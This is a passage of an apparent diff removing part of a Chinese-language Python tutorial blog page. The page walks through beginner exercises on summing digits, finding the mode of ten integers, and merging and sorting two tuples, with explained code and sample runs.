-<li><code>a = [1, 2, 3]</code>（通過列表生成式將每一位數轉換成整數列表）</li>
-<li><code>sum(a) = 6</code></li>
-<li>輸出結果：<code>Sum of all digits of 123 is 6</code></li>
-</ul>
-</li>
-<li><strong>第二筆測試資料</strong>：<ul>
-<li><code>n = 456</code></li>
-<li><code>a = [4, 5, 6]</code></li>
-<li><code>sum(a) = 15</code></li>
-<li>輸出結果：<code>Sum of all digits of 456 is 15</code></li>
-</ul>
-</li>
-</ol>
-<hr>
-<p>設計說明：</p>
-<p>請撰寫一程式，讓使用者輸入十個整數作為樣本數，輸出眾數（樣本中出現最多次的數字）及其出現的次數。</p>
-<p>提示：假設樣本中只有一個眾數。</p>
-<h3 id="整體程式碼回顧"><a href="#整體程式碼回顧" class="headerlink" title="整體程式碼回顧"></a>整體程式碼回顧</h3><p>目的是讓使用者輸入十個整數，然後找出這些整數中的眾數（出現次數最多的整數）。</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = [<span class="number">0</span>] * <span class="number">100</span>  <span class="comment"># 創建一個列表，大小為100，用來計數</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):  <span class="comment"># 迴圈執行10次，讓使用者輸入10個數字</span></span><br><span class="line">    n = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;請輸入整數（範圍 0~99）：&#x27;</span>))  <span class="comment"># 讀取使用者輸入的整數</span></span><br><span class="line">    <span class="keyword">if</span> <span class="number">0</span> &lt;= n &lt; <span class="number">100</span>:  <span class="comment"># 檢查輸入數字是否在範圍內</span></span><br><span class="line">        m[n] += <span class="number">1</span>  <span class="comment"># 如果在範圍內，對應的索引位置加1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 找出眾數</span></span><br><span class="line">mode_count = <span class="built_in">max</span>(m)  <span class="comment"># 取得最大出現次數</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):  <span class="comment"># 檢查所有可能的整數</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">max</span>(m) == m[i]:  <span class="comment"># 如果該整數的出現次數等於最大出現次數</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;眾數是: <span class="subst">&#123;i&#125;</span>&#x27;</span>)  <span class="comment"># 輸出該整數</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;眾數出現的次數: <span class="subst">&#123;mode_count&#125;</span>&#x27;</span>)  <span class="comment"># 輸出眾數的出現次數</span></span><br></pre></td></tr></table></figure>
-
-<h3 id="步驟解析"><a href="#步驟解析" class="headerlink" title="步驟解析"></a>步驟解析</h3><ol>
-<li><p><strong>創建列表</strong>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">m = [<span class="number">0</span>] * <span class="number">100</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>這行創建一個包含 100 個元素的列表 <code>m</code>，所有元素都初始化為 0。</li>
-<li>這個列表的索引 <code>0</code> 到 <code>99</code> 會用來代表這些整數的值（因為整數範圍是 0 到 99），而每個索引的位置存儲的是該數字出現的次數。</li>
-</ul>
-</li>
-<li><p><strong>輸入整數</strong>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    n = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;請輸入整數（範圍 0~99）：&#x27;</span>))</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>這個迴圈會執行 10 次，讓使用者輸入十個整數。</li>
-</ul>
-</li>
-<li><p><strong>檢查範圍並計數</strong>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="number">0</span> &lt;= n &lt; <span class="number">100</span>:</span><br><span class="line">    m[n] += <span class="number">1</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>檢查輸入的整數 <code>n</code> 是否在有效範圍內（0 到 99）。</li>
-<li>如果有效，則對應的 <code>m[n]</code> 索引的值會加 1，這表示這個整數出現了一次。</li>
-</ul>
-</li>
-</ol>
-<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>假設使用者依序輸入了以下整數：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">3</span><br><span class="line">3</span><br><span class="line">5</span><br><span class="line">7</span><br><span class="line">3</span><br><span class="line">2</span><br><span class="line">5</span><br><span class="line">5</span><br><span class="line">1</span><br><span class="line">3</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>初始時，列表 <code>m</code> 是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = [0, 0, 0, 0, 0, 0, 0, 0, 0, 0, ..., 0]  # 0 到 99 都是 0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-</li>
-<li><p>當使用者輸入每個數字後，列表 <code>m</code> 將如下更新：</p>
-<ol>
-<li>輸入 <code>3</code>：<code>m[3] += 1</code> → <code>m[3]</code> 變成 1。</li>
-<li>輸入 <code>3</code>：<code>m[3] += 1</code> → <code>m[3]</code> 變成 2。</li>
-<li>輸入 <code>5</code>：<code>m[5] += 1</code> → <code>m[5]</code> 變成 1。</li>
-<li>輸入 <code>7</code>：<code>m[7] += 1</code> → <code>m[7]</code> 變成 1。</li>
-<li>輸入 <code>3</code>：<code>m[3] += 1</code> → <code>m[3]</code> 變成 3。</li>
-<li>輸入 <code>2</code>：<code>m[2] += 1</code> → <code>m[2]</code> 變成 1。</li>
-<li>輸入 <code>5</code>：<code>m[5] += 1</code> → <code>m[5]</code> 變成 2。</li>
-<li>輸入 <code>5</code>：<code>m[5] += 1</code> → <code>m[5]</code> 變成 3。</li>
-<li>輸入 <code>1</code>：<code>m[1] += 1</code> → <code>m[1]</code> 變成 1。</li>
-<li>輸入 <code>3</code>：<code>m[3] += 1</code> → <code>m[3]</code> 變成 4。</li>
-</ol>
-</li>
-<li><p>最後，列表 <code>m</code> 會是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">m = [0, 1, 1, 4, 0, 3, 0, 1, 0, ..., 0]  # m[3] = 4，m[5] = 3，其他為 0</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h3 id="找到眾數"><a href="#找到眾數" class="headerlink" title="找到眾數"></a>找到眾數</h3><ol start="4">
-<li><p><strong>尋找眾數</strong>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">mode_count = <span class="built_in">max</span>(m)  <span class="comment"># 找到出現次數的最大值</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>mode_count</code> 現在會是 <code>4</code>，因為 <code>m[3]</code> 是出現次數最多的。</li>
-</ul>
-</li>
-<li><p><strong>輸出眾數</strong>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">max</span>(m) == m[i]:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;眾數是: <span class="subst">&#123;i&#125;</span>&#x27;</span>)  <span class="comment"># 如果出現次數等於最大出現次數，則打印該數</span></span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><p>這個迴圈會檢查每個整數（從 0 到 99）：</p>
-<ul>
-<li>當 <code>i = 3</code> 時，因為 <code>m[3]</code> 是 <code>4</code>，所以打印 <code>3</code>。</li>
-</ul>
-</li>
-<li><p>結果是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">眾數是: 3</span><br></pre></td></tr></table></figure></li>
-</ul>
-</li>
-</ol>
-<h3 id="總結-1"><a href="#總結-1" class="headerlink" title="總結"></a>總結</h3><ul>
-<li>我們使用列表 <code>m</code> 來統計每個整數出現的次數，透過列表的索引來直接對應整數的值。</li>
-<li>使用 <code>max(m)</code> 找到出現最多的次數，再用迴圈找出對應的整數，這就是我們的眾數。</li>
-</ul>
-<hr>
-<p>設計說明：</p>
-<p>請撰寫一程式，輸入並建立兩組數組，各以-9999為結束點（數組中不包含-9999）。將此兩數組合併並從小到大排序之，顯示排序前的數組和排序後的串列</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">tuple1 = ()</span><br><span class="line">num = eval(input(&#x27;Create tuple1:\n&#x27;))</span><br><span class="line">while num !=-9999:</span><br><span class="line">    tuple1 +=(num,)</span><br><span class="line">    num = eval(input())</span><br><span class="line">tuple2 = ()</span><br><span class="line">num = eval(input(&#x27;Create tuple2:\n&#x27;))</span><br><span class="line">while num !=-9999:</span><br><span class="line">    tuple2 +=(num,)</span><br><span class="line">    num = eval(input())</span><br><span class="line">tuple1 += tuple2</span><br><span class="line">print(&#x27;Combined tuple before sorting:&#x27;,tuple1)</span><br><span class="line">LIST = list(tuple1)</span><br><span class="line">LIST.sort()</span><br><span class="line">print(&#x27;Combined list after sorting:&#x27;,LIST)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-<h3 id="逐步解釋"><a href="#逐步解釋" class="headerlink" title="逐步解釋"></a>逐步解釋</h3><ol>
-<li><p><strong>初始化元組</strong>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tuple1 = ()</span><br></pre></td></tr></table></figure>
-
-<p>這行程式碼初始化了一個空的元組 <code>tuple1</code>。元組是一種不可變的數據結構，這意味著一旦創建後，就不能更改其中的內容。</p>
-</li>
-<li><p><strong>輸入和建立第一組數組</strong>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">num = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&#x27;Create tuple1:\n&#x27;</span>))</span><br><span class="line"><span class="keyword">while</span> num !=-<span class="number">9999</span>:</span><br><span class="line">    tuple1 +=(num,)</span><br><span class="line">    num = <span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>輸入數值</strong>：使用 <code>input()</code> 函數讓使用者輸入數值，並使用 <code>eval()</code> 將輸入的字符串轉換為數值（整數或浮點數）。</li>
-<li><strong>迴圈結束條件</strong>：<code>while num != -9999:</code> 確保使用者可以不斷輸入數字，直到輸入 <code>-9999</code> 為止。</li>
-<li><strong>元組的拼接</strong>：<code>tuple1 += (num,)</code> 這行程式碼將輸入的數字作為一個單元素的元組進行拼接。這是元組添加元素的方式，因為元組是不可變的，你無法直接改變它的內容，因此需要創建一個新的元組來包含新元素。</li>
-</ul>
-</li>
-<li><p><strong>輸入和建立第二組數組</strong>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tuple2 = ()</span><br><span class="line">num = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&#x27;Create tuple2:\n&#x27;</span>))</span><br><span class="line"><span class="keyword">while</span> num !=-<span class="number">9999</span>:</span><br><span class="line">    tuple2 +=(num,)</span><br><span class="line">    num = <span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br></pre></td></tr></table></figure>
-
-<p>這部分程式碼與第一組數組的建立非常相似，目的是創建第二個元組 <code>tuple2</code>，使用者輸入的數值也在 <code>-9999</code> 之前。</p>
-</li>
-<li><p><strong>合併兩個元組</strong>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">tuple1 += tuple2</span><br></pre></td></tr></table></figure>
-
-<p>這行程式碼將 <code>tuple2</code> 合併到 <code>tuple1</code> 中，創建了一個包含兩組數據的元組。</p>
-</li>
-<li><p><strong>顯示合併前的元組</strong>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Combined tuple before sorting:&#x27;</span>, tuple1)</span><br></pre></td></tr></table></figure>
-
-<p>在進行排序之前，將合併後的元組輸出顯示。</p>
-</li>
-<li><p><strong>將元組轉換為列表並排序</strong>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LIST = <span class="built_in">list</span>(tuple1)</span><br><span class="line">LIST.sort()</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><strong>轉換為列表</strong>：<code>list(tuple1)</code> 將元組轉換為可變的列表，這樣可以進行排序等操作。</li>
-<li><strong>排序</strong>：<code>LIST.sort()</code> 將列表中的元素從小到大排序。</li>
-</ul>
-</li>
-<li><p><strong>顯示排序後的列表</strong>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Combined list after sorting:&#x27;</span>, LIST)</span><br></pre></td></tr></table></figure>
-
-<p>最後，將排序後的列表顯示出來。</p>
-</li>
-</ol>
-<ul>
-<li>題外話</li>
-</ul>
-<p>要將合併的元組中的元素從大到小排序，你只需在排序時指定參數 <code>reverse=True</code></p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 初始化第一組元組</span></span><br><span class="line">tuple1 = ()</span><br><span class="line">num = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&#x27;Create tuple1:\n&#x27;</span>))</span><br><span class="line"><span class="keyword">while</span> num != -<span class="number">9999</span>:</span><br><span class="line">    tuple1 += (num,)</span><br><span class="line">    num = <span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化第二組元組</span></span><br><span class="line">tuple2 = ()</span><br><span class="line">num = <span class="built_in">eval</span>(<span class="built_in">input</span>(<span class="string">&#x27;Create tuple2:\n&#x27;</span>))</span><br><span class="line"><span class="keyword">while</span> num != -<span class="number">9999</span>:</span><br><span class="line">    tuple2 += (num,)</span><br><span class="line">    num = <span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 合併兩個元組</span></span><br><span class="line">tuple1 += tuple2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示合併前的元組</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Combined tuple before sorting:&#x27;</span>, tuple1)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 將元組轉換為列表並排序（從大到小）</span></span><br><span class="line">LIST = <span class="built_in">list</span>(tuple1)</span><br><span class="line">LIST.sort(reverse=<span class="literal">True</span>)  <span class="comment"># 設定 reverse=True 來從大到小排序</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 顯示排序後的列表</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Combined list after sorting:&#x27;</span>, LIST)</span><br></pre></td></tr></table></figure>
-
-
-<ol>
-<li><p><strong>將元組轉換為列表</strong>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LIST = <span class="built_in">list</span>(tuple1)</span><br></pre></td></tr></table></figure>
-
-<p>將合併的元組轉換為可變的列表，以便可以進行排序。</p>
-</li>
-<li><p><strong>排序列表</strong>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">LIST.sort(reverse=<span class="literal">True</span>)</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li>在這裡，<code>sort()</code> 方法的 <code>reverse=True</code> 參數告訴 Python 將列表按降序（從大到小）進行排序。</li>
-</ul>
-</li>
-<li><p><strong>顯示結果</strong>：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Combined list after sorting:&#x27;</span>, LIST)</span><br></pre></td></tr></table></figure></li>
-</ol>
-<h3 id="範例輸入輸出"><a href="#範例輸入輸出" class="headerlink" title="範例輸入輸出"></a>範例輸入輸出</h3><p>如果使用者的輸入是：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Create tuple1:</span><br><span class="line">5</span><br><span class="line">10</span><br><span class="line">3</span><br><span class="line">-9999</span><br><span class="line">Create tuple2:</span><br><span class="line">8</span><br><span class="line">2</span><br><span class="line">-9999</span><br></pre></td></tr></table></figure>
-
-<p>則合併後的元組會是 <code>(5, 10, 3, 8, 2)</code>，排序後的列表將顯示為：</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Combined list after sorting: [10, 8, 5, 3, 2]</span><br></pre></td></tr></table></figure>
 
       
     </div>
